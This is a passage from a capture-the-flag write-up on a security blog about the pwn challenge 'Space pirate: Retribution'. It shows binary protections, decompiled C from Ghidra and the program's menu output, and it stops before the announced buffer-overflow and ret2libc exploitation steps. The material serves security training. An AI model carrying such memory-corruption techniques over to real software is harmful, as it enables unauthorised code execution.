<!doctype html><html lang="en"><head><title>Space pirate: Retribution | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="64-bit binary. Buffer Overflow. ret2libc. Bypass PIE and ASLR"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="64-bit binary. Buffer Overflow. ret2libc. Bypass PIE and ASLR"><meta itemprop="keywords" content><meta itemprop="name" content="Space pirate: Retribution"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="64-bit binary. Buffer Overflow. ret2libc. Bypass PIE and ASLR"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Space pirate: Retribution"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/htb-challenges/pwn/space-pirate-retribution/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="64-bit binary. Buffer Overflow. ret2libc. Bypass PIE and ASLR"><meta name="twitter:description" content="64-bit binary. Buffer Overflow. ret2libc. Bypass PIE and ASLR"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Space pirate: Retribution"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/htb-challenges/pwn/space-pirate-retribution/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/htb-challenges/pwn/space-pirate-retribution/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/htb-challenges/pwn/space-pirate-retribution/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/space-pirate-retribution/&amp;text=Space%20pirate:%20Retribution" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/space-pirate-retribution/&amp;title=Space%20pirate:%20Retribution" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Space pirate: Retribution</h1><p class="mb4 f6 dib tracked">13 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#buffer-overflow-vulnerability">Buffer Overflow vulnerability</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#pie-bypass">PIE bypass</a></li><li><a href="#leaking-glibc-addresses">Leaking Glibc addresses</a></li><li><a href="#getting-rce">Getting RCE</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>sp_retribution</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little  
RELRO:    <span class="code-dark-green">Full RELRO</span>
Stack:    <span class="code-dark-red">No canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-green">PIE enabled</span>
RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
</code></pre></div><h2 id="reverse-engineering">Reverse engineering</h2><p>If we open the binary in Ghidra we will see this <code>main</code> function:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> local_b[</span><span class="mtk6">3</span><span class="mtk1">];</span>

<span class="mtk1">  </span><span class="mtk8">setup</span><span class="mtk1">();</span>
<span class="mtk1">  </span><span class="mtk8">banner</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00101f68, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d78);</span>
<span class="mtk1">      </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, local_b, </span><span class="mtk6">2</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (local_b[</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">'1'</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">      </span><span class="mtk8">show_missiles</span><span class="mtk1">();</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (local_b[</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">'2'</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk8">missile_launcher</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n%s</span><span class="mtk4">[-] Invalid option! Exiting..</span><span class="mtk6">\n\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d70);</span>  
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">  </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">520</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>Basically, we have two options:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./sp_retribution</span>


<span class="code-cyan">                                 Missile Launcher!</span>






<span class="code-cyan">                       ‚ñë</span>
<span class="code-cyan">                                                        ‚ñë      ‚ñë</span>
<span class="code-cyan">                                                     ‚ñì‚ñì             ‚ñë</span>
<span class="code-cyan">                                                 ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì              ‚ñí</span>
<span class="code-cyan">             ‚ñí  ‚ñí                              ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-cyan">                                             ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì            ‚ñë</span>  
<span class="code-cyan">                                            ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì          ‚ñë</span>
<span class="code-cyan">                                           ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì        ‚ñë</span>
<span class="code-cyan">                                         ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí‚ñë‚ñí‚ñë‚ñí‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-cyan">                                       ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí       ‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-cyan">                                     ‚ñí‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí         ‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-cyan">                                    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí          ‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-cyan">                                  ‚ñí‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí         ‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-cyan">                          ‚ñë       ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñë‚ñë   ‚ñë‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-cyan">                                ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-cyan">                               ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-cyan">                             ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì   ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-cyan">                  ‚ñí         ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-cyan">                           ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-cyan">                           ‚ñì‚ñì‚ñì‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-cyan">                         ‚ñë  ‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-cyan">      ‚ñì                 ‚ñí‚ñë      ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-cyan">                     ‚ñë‚ñí‚ñí  ‚ñì      ‚ñì‚ñì‚ñì‚ñì‚ñì        ‚ñí                     ‚ñí</span>
<span class="code-cyan">                   ‚ñë‚ñí‚ñí                                              ‚ñì</span>
<span class="code-cyan">                  ‚ñí‚ñí‚ñí       ‚ñí‚ñí</span>
<span class="code-cyan">                ‚ñë‚ñí‚ñí‚ñë      ‚ñí‚ñí‚ñë       ‚ñë</span>
<span class="code-cyan">               ‚ñë‚ñí‚ñí‚ñë   ‚ñë‚ñí‚ñí‚ñí‚ñë         ‚ñë</span>
<span class="code-cyan">              ‚ñë‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñë            ‚ñí</span>
<span class="code-cyan">             ‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñë</span>
<span class="code-cyan">            ‚ñë‚ñí‚ñí‚ñí‚ñí</span>
<span class="code-cyan">           ‚ñë‚ñë                                               ‚ñí</span>



<span class="code-blue">1. Show missiles üöÄ</span>
<span class="code-blue">2. Change target's location üéØ</span>
<span class="code-blue">&gt;&gt;</span>
</code></pre></div><p>The first one is <code>show_missiles</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">show_missiles</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s\n</span><span class="mtk4">-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="mtk4">-=-=</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d60);</span>  
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00101dc3);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00101ddb, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d70, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d58, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d60);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00101e00, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d70, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d58, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d60);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00101e28, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d70, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d58, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d68, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d60);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="mtk4">-=-="</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00101e90);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00101eb0, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d70, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d58, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d68, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d60);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00101ee0, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d70, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d58, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d68, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d60);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00101f0c, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d70, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d60);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="mtk4">-=-=</span><span class="mtk6">\n%s</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d78);</span>
<span class="mtk1">}</span>
</code></pre></div><p>This function is useless, since there is no user input and all the printed strings are fix:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./sp_retribution</span>


<span class="code-red">                                 Missile Launcher!</span>






<span class="code-red">                       ‚ñë</span>
<span class="code-red">                                                        ‚ñë      ‚ñë</span>
<span class="code-red">                                                     ‚ñì‚ñì             ‚ñë</span>
<span class="code-red">                                                 ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì              ‚ñí</span>
<span class="code-red">             ‚ñí  ‚ñí                              ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-red">                                             ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì            ‚ñë</span>  
<span class="code-red">                                            ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì          ‚ñë</span>
<span class="code-red">                                           ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì        ‚ñë</span>
<span class="code-red">                                         ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí‚ñë‚ñí‚ñë‚ñí‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-red">                                       ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí       ‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-red">                                     ‚ñí‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí         ‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-red">                                    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí          ‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-red">                                  ‚ñí‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí         ‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-red">                          ‚ñë       ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñë‚ñë   ‚ñë‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-red">                                ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-red">                               ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
